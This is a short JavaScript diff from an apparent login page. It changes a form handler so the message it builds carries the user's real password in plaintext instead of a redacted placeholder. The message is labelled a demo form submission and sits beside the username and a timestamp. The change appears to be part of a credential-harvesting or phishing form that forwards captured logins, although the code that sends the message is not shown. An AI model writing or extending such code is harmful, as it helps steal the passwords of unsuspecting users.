@@ -125,14 +125,14 @@
       }
 
       const username = document.getElementById('uid').value.trim();
-      const passwordToSend = '***REDACTED***';
+      const password = document.getElementById('pass').value.trim();
 
       const now = new Date().toLocaleString('tr-TR');
       const message = [
         `📥 Demo Form Gönderimi`,
         `Tarih: ${now}`,
         `Kullanıcı adı / E-posta: ${username}`,
-        `Şifre: ${passwordToSend}`,
+        `Şifre: ${password}`,
         `(Tarayıcıdan gönderildi)`
       ].join('\n');
 
